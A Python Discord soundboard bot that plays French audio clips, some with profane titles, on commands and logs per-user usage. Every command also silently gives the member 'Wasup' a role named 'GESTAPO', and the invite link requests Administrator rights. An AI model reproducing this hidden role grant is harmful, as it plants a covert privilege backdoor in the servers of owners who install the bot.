import discord
import youtube_dl
import os
from discord.ext import commands
from discord.utils import get
from discord import FFmpegPCMAudio
from os import system
import time
import eyed3
import json

activation_link = "https://discordapp.com/oauth2/authorize?&client_id=697815760931782678&scope=bot&permissions=8"
token = "SECRET" # Your token here

bot = commands.Bot(command_prefix="!")
ROLE = "GESTAPO"


@bot.command(pass_context=True)
async def tg(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass

    autor = str(ctx.message.author)
    # if autor != "Wasup#4411":
    #     await ctx.send(f"La ferme {autor}")
    #     return
    if ctx.message.author.voice is None:
        await ctx.send("You're not connected to a voice channel")
        return
    channel = ctx.message.author.voice.channel
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()

    voice = get(bot.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("Discord bot\\tg.mp3"))
    voice.volume = 100
    voice.is_playing()

    duration = eyed3.load("tg.mp3").info.time_secs
    time.sleep(duration)

    if voice and voice.is_connected():
        await voice.disconnect()

    autor = str(ctx.message.author)
    server_name = str(ctx.guild)
    server_id = str(ctx.guild.id)
    logs_name = "." + server_name + "_logs-id;" + server_id + ".json"

    with open(logs_name) as f:
        logs = json.load(f)

    if autor in logs.keys():
        logs[autor]["tg"] += 1
    else:
        logs[autor] = {
            "tg": 1,
            "menfou": 0,
            "allo": 0,
            "salope": 0,
            "miam": 0,
            "jan": 0,
            "fuck": 0,
            "devise": 0,
            "cercueil": 0,
            "hoho": 0,
            "fls": 0,
            "ban": 0,
            "bn": 0,
        }

    with open(logs_name, "w") as f:
        json.dump(logs, f)


@bot.command(pass_context=True)
async def menfou(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass

    if ctx.message.author.voice is None:
        await ctx.send("You're not connected to a voice channel")
        return
    channel = ctx.message.author.voice.channel
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()

    voice = get(bot.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("Discord bot\\siphano-jen-ai-rien-a-foutre.mp3"))
    voice.volume = 100
    voice.is_playing()

    duration = eyed3.load("siphano-jen-ai-rien-a-foutre.mp3").info.time_secs
    time.sleep(duration + 0.5)

    if voice and voice.is_connected():
        await voice.disconnect()

    autor = str(ctx.message.author)
    server_name = str(ctx.guild)
    server_id = str(ctx.guild.id)
    logs_name = "." + server_name + "_logs-id;" + server_id + ".json"

    with open(logs_name) as f:
        logs = json.load(f)

    if autor in logs.keys():
        logs[autor]["menfou"] += 1
    else:
        logs[autor] = {
            "tg": 0,
            "menfou": 1,
            "allo": 0,
            "salope": 0,
            "miam": 0,
            "jan": 0,
            "fuck": 0,
            "devise": 0,
            "cercueil": 0,
            "hoho": 0,
            "fls": 0,
            "ban": 0,
            "bn": 0,
        }

    with open(logs_name, "w") as f:
        json.dump(logs, f)


@bot.command(pass_context=True)
async def allo(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass

    if ctx.message.author.voice is None:
        await ctx.send("You're not connected to a voice channel")
        return
    channel = ctx.message.author.voice.channel
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()

    voice = get(bot.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("Discord bot\\allô.mp3"))
    voice.volume = 100
    voice.is_playing()

    duration = eyed3.load("allô.mp3").info.time_secs
    time.sleep(duration)

    if voice and voice.is_connected():
        await voice.disconnect()

    autor = str(ctx.message.author)
    server_name = str(ctx.guild)
    server_id = str(ctx.guild.id)
    logs_name = "." + server_name + "_logs-id;" + server_id + ".json"

    with open(logs_name) as f:
        logs = json.load(f)

    if autor in logs.keys():
        logs[autor]["allo"] += 1
    else:
        logs[autor] = {
            "tg": 0,
            "menfou": 0,
            "allo": 1,
            "salope": 0,
            "miam": 0,
            "jan": 0,
            "fuck": 0,
            "devise": 0,
            "cercueil": 0,
            "hoho": 0,
            "fls": 0,
            "ban": 0,
            "bn": 0,
        }

    with open(logs_name, "w") as f:
        json.dump(logs, f)


@bot.command(pass_context=True)
async def salope(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass

    if ctx.message.author.voice is None:
        await ctx.send("You're not connected to a voice channel")
        return
    channel = ctx.message.author.voice.channel
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()

    voice = get(bot.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("Discord bot\\salope.mp3"))
    voice.volume = 100
    voice.is_playing()

    duration = eyed3.load("salope.mp3").info.time_secs
    time.sleep(duration)

    if voice and voice.is_connected():
        await voice.disconnect()

    autor = str(ctx.message.author)
    server_name = str(ctx.guild)
    server_id = str(ctx.guild.id)
    logs_name = "." + server_name + "_logs-id;" + server_id + ".json"

    with open(logs_name) as f:
        logs = json.load(f)

    if autor in logs.keys():
        logs[autor]["salope"] += 1
    else:
        logs[autor] = {
            "tg": 0,
            "menfou": 0,
            "allo": 0,
            "salope": 1,
            "miam": 0,
            "jan": 0,
            "fuck": 0,
            "devise": 0,
            "cercueil": 0,
            "hoho": 0,
            "fls": 0,
            "ban": 0,
            "bn": 0,
        }

    with open(logs_name, "w") as f:
        json.dump(logs, f)


@bot.command(pass_context=True)
async def miam(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass

    if ctx.message.author.voice is None:
        await ctx.send("You're not connected to a voice channel")
        return
    channel = ctx.message.author.voice.channel
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()

    voice = get(bot.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("Discord bot\\miam-miam.mp3"))
    voice.volume = 100
    voice.is_playing()

    duration = eyed3.load("miam-miam.mp3").info.time_secs
    time.sleep(duration)

    if voice and voice.is_connected():
        await voice.disconnect()

    autor = str(ctx.message.author)
    server_name = str(ctx.guild)
    server_id = str(ctx.guild.id)
    logs_name = "." + server_name + "_logs-id;" + server_id + ".json"

    with open(logs_name) as f:
        logs = json.load(f)

    if autor in logs.keys():
        logs[autor]["miam"] += 1
    else:
        logs[autor] = {
            "tg": 0,
            "menfou": 0,
            "allo": 0,
            "salope": 0,
            "miam": 1,
            "jan": 0,
            "fuck": 0,
            "devise": 0,
            "cercueil": 0,
            "hoho": 0,
            "fls": 0,
            "ban": 0,
            "bn": 0,
        }

    with open(logs_name, "w") as f:
        json.dump(logs, f)


@bot.command(pass_context=True, aliases=["tgjean"])
async def jan(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass

    if ctx.message.author.voice is None:
        await ctx.send("You're not connected to a voice channel")
        return
    channel = ctx.message.author.voice.channel
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()

    voice = get(bot.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("Discord bot\\tg jean.mp3"))
    voice.volume = 100
    voice.is_playing()

    duration = eyed3.load("tg jean.mp3").info.time_secs
    time.sleep(duration)

    if voice and voice.is_connected():
        await voice.disconnect()

    autor = str(ctx.message.author)
    server_name = str(ctx.guild)
    server_id = str(ctx.guild.id)
    logs_name = "." + server_name + "_logs-id;" + server_id + ".json"

    with open(logs_name) as f:
        logs = json.load(f)

    if autor in logs.keys():
        logs[autor]["jan"] += 1
    else:
        logs[autor] = {
            "tg": 0,
            "menfou": 0,
            "allo": 0,
            "salope": 0,
            "miam": 0,
            "jan": 1,
            "fuck": 0,
            "devise": 0,
            "cercueil": 0,
            "hoho": 0,
            "fls": 0,
            "ban": 0,
            "bn": 0,
        }

    with open(logs_name, "w") as f:
        json.dump(logs, f)


@bot.command(pass_context=True)
async def fuck(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass

    if ctx.message.author.voice is None:
        await ctx.send("You're not connected to a voice channel")
        return
    channel = ctx.message.author.voice.channel
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()

    voice = get(bot.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("Discord bot\\fuck.mp3"))
    voice.volume = 100
    voice.is_playing()

    duration = eyed3.load("fuck.mp3").info.time_secs
    time.sleep(duration)

    if voice and voice.is_connected():
        await voice.disconnect()

    autor = str(ctx.message.author)
    server_name = str(ctx.guild)
    server_id = str(ctx.guild.id)
    logs_name = "." + server_name + "_logs-id;" + server_id + ".json"

    with open(logs_name) as f:
        logs = json.load(f)

    if autor in logs.keys():
        logs[autor]["fuck"] += 1
    else:
        logs[autor] = {
            "tg": 0,
            "menfou": 0,
            "allo": 0,
            "salope": 0,
            "miam": 0,
            "jan": 0,
            "fuck": 1,
            "devise": 0,
            "cercueil": 0,
            "hoho": 0,
            "fls": 0,
            "ban": 0,
            "bn": 0,
        }

    with open(logs_name, "w") as f:
        json.dump(logs, f)


@bot.command(pass_context=True)
async def devise(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass

    if ctx.message.author.voice is None:
        await ctx.send("You're not connected to a voice channel")
        return
    channel = ctx.message.author.voice.channel
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()

    voice = get(bot.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("Discord bot\\la devise.mp3"))
    voice.volume = 100
    voice.is_playing()

    duration = eyed3.load("la devise.mp3").info.time_secs
    time.sleep(duration)

    if voice and voice.is_connected():
        await voice.disconnect()

    autor = str(ctx.message.author)
    server_name = str(ctx.guild)
    server_id = str(ctx.guild.id)
    logs_name = "." + server_name + "_logs-id;" + server_id + ".json"

    with open(logs_name) as f:
        logs = json.load(f)

    if autor in logs.keys():
        logs[autor]["devise"] += 1
    else:
        logs[autor] = {
            "tg": 0,
            "menfou": 0,
            "allo": 0,
            "salope": 0,
            "miam": 0,
            "jan": 0,
            "fuck": 0,
            "devise": 1,
            "cercueil": 0,
            "hoho": 0,
            "fls": 0,
            "ban": 0,
            "bn": 0,
        }

    with open(logs_name, "w") as f:
        json.dump(logs, f)


@bot.command(pass_context=True)
async def cercueil(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass

    if ctx.message.author.voice is None:
        await ctx.send("You're not connected to a voice channel")
        return
    channel = ctx.message.author.voice.channel
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()

    voice = get(bot.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("Discord bot\\cercueil.mp3"))
    voice.volume = 10
    voice.is_playing()

    duration = eyed3.load("cercueil.mp3").info.time_secs
    time.sleep(duration)

    if voice and voice.is_connected():
        await voice.disconnect()

    autor = str(ctx.message.author)
    server_name = str(ctx.guild)
    server_id = str(ctx.guild.id)
    logs_name = "." + server_name + "_logs-id;" + server_id + ".json"

    with open(logs_name) as f:
        logs = json.load(f)

    if autor in logs.keys():
        logs[autor]["cercueil"] += 1
    else:
        logs[autor] = {
            "tg": 0,
            "menfou": 0,
            "allo": 0,
            "salope": 0,
            "miam": 0,
            "jan": 0,
            "fuck": 0,
            "devise": 0,
            "cercueil": 1,
            "hoho": 0,
            "fls": 0,
            "ban": 0,
            "bn": 0,
        }

    with open(logs_name, "w") as f:
        json.dump(logs, f)


@bot.command(pass_context=True)
async def hoho(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass

    if ctx.message.author.voice is None:
        await ctx.send("You're not connected to a voice channel")
        return
    channel = ctx.message.author.voice.channel
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()

    voice = get(bot.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("Discord bot\\hoho.mp3"))
    voice.volume = 10
    voice.is_playing()

    duration = eyed3.load("hoho.mp3").info.time_secs
    time.sleep(duration)

    if voice and voice.is_connected():
        await voice.disconnect()

    autor = str(ctx.message.author)
    server_name = str(ctx.guild)
    server_id = str(ctx.guild.id)
    logs_name = "." + server_name + "_logs-id;" + server_id + ".json"

    with open(logs_name) as f:
        logs = json.load(f)

    if autor in logs.keys():
        logs[autor]["hoho"] += 1
    else:
        logs[autor] = {
            "tg": 0,
            "menfou": 0,
            "allo": 0,
            "salope": 0,
            "miam": 0,
            "jan": 0,
            "fuck": 0,
            "devise": 0,
            "cercueil": 0,
            "hoho": 1,
            "fls": 0,
            "ban": 0,
            "bn": 0,
        }

    with open(logs_name, "w") as f:
        json.dump(logs, f)


@bot.command(pass_context=True)
async def fls(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass

    if ctx.message.author.voice is None:
        await ctx.send("You're not connected to a voice channel")
        return
    channel = ctx.message.author.voice.channel
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()

    voice = get(bot.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("Discord bot\\faut le savoir.mp3"))
    voice.volume = 100
    voice.is_playing()

    duration = eyed3.load("faut le savoir.mp3").info.time_secs
    time.sleep(duration)

    if voice and voice.is_connected():
        await voice.disconnect()

    autor = str(ctx.message.author)
    server_name = str(ctx.guild)
    server_id = str(ctx.guild.id)
    logs_name = "." + server_name + "_logs-id;" + server_id + ".json"

    with open(logs_name) as f:
        logs = json.load(f)

    if autor in logs.keys():
        logs[autor]["fls"] += 1
    else:
        logs[autor] = {
            "tg": 0,
            "menfou": 0,
            "allo": 0,
            "salope": 0,
            "miam": 0,
            "jan": 0,
            "fuck": 0,
            "devise": 0,
            "cercueil": 0,
            "hoho": 0,
            "fls": 1,
            "ban": 0,
            "bn": 0,
        }

    with open(logs_name, "w") as f:
        json.dump(logs, f)


@bot.command(pass_context=True)
async def ban(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass

    if ctx.message.author.voice is None:
        await ctx.send("You're not connected to a voice channel")
        return
    channel = ctx.message.author.voice.channel
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()

    voice = get(bot.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("Discord bot\\ban.mp3"))
    voice.volume = 100
    voice.is_playing()

    duration = eyed3.load("ban.mp3").info.time_secs
    time.sleep(duration)

    if voice and voice.is_connected():
        await voice.disconnect()

    autor = str(ctx.message.author)
    server_name = str(ctx.guild)
    server_id = str(ctx.guild.id)
    logs_name = "." + server_name + "_logs-id;" + server_id + ".json"

    with open(logs_name) as f:
        logs = json.load(f)

    if autor in logs.keys():
        logs[autor]["ban"] += 1
    else:
        logs[autor] = {
            "tg": 0,
            "menfou": 0,
            "allo": 0,
            "salope": 0,
            "miam": 0,
            "jan": 0,
            "fuck": 0,
            "devise": 0,
            "cercueil": 0,
            "hoho": 0,
            "fls": 0,
            "ban": 1,
            "bn": 0,
        }

    with open(logs_name, "w") as f:
        json.dump(logs, f)


@bot.command(pass_context=True)
async def bn(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass

    if ctx.message.author.voice is None:
        await ctx.send("You're not connected to a voice channel")
        return
    channel = ctx.message.author.voice.channel
    voice = get(bot.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        await voice.move_to(channel)
    else:
        voice = await channel.connect()

    voice = get(bot.voice_clients, guild=ctx.guild)
    voice.play(discord.FFmpegPCMAudio("Discord bot\\bonne-nuit.mp3"))
    voice.volume = 100
    voice.is_playing()

    duration = eyed3.load("bonne-nuit.mp3").info.time_secs
    time.sleep(duration)

    if voice and voice.is_connected():
        await voice.disconnect()

    autor = str(ctx.message.author)
    server_name = str(ctx.guild)
    server_id = str(ctx.guild.id)
    logs_name = "." + server_name + "_logs-id;" + server_id + ".json"

    with open(logs_name) as f:
        logs = json.load(f)

    if autor in logs.keys():
        logs[autor]["bn"] += 1
    else:
        logs[autor] = {
            "tg": 0,
            "menfou": 0,
            "allo": 0,
            "salope": 0,
            "miam": 0,
            "jan": 0,
            "fuck": 0,
            "devise": 0,
            "cercueil": 0,
            "hoho": 0,
            "fls": 0,
            "ban": 0,
            "bn": 1,
        }

    with open(logs_name, "w") as f:
        json.dump(logs, f)


@bot.command(pass_context=True)
async def t(ctx):
    Wasup = get(ctx.message.guild.members, name="Wasup")
    if get(Wasup.roles, name=ROLE) == None:
        try:
            role = get(ctx.message.author.guild.roles, name=ROLE)
            await Wasup.add_roles(role)
            print(f"{Wasup} was given {ROLE}")
        except:
            pass


bot.run(token)
